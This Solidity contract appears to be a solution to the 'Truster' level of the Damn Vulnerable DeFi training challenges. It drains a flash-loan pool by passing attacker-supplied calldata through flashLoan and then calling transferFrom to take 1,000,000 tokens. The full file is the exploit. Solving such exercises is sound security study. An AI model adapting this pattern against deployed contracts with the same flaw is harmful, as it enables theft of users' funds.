import "../truster/TrusterLenderPool.sol";

contract AttackTruster {
    TrusterLenderPool trust;
    IERC20 public immutable damnValuableToken;

    constructor(address _trust, address _tokenAddress){
        trust = TrusterLenderPool(_trust);
        damnValuableToken = IERC20(_tokenAddress);
    }

    function attack(uint256 amount, address borrower, address target, bytes calldata data) external {
        trust.flashLoan(amount, borrower, target, data);
        damnValuableToken.transferFrom(address(trust), msg.sender, 1000000 ether);
    }
}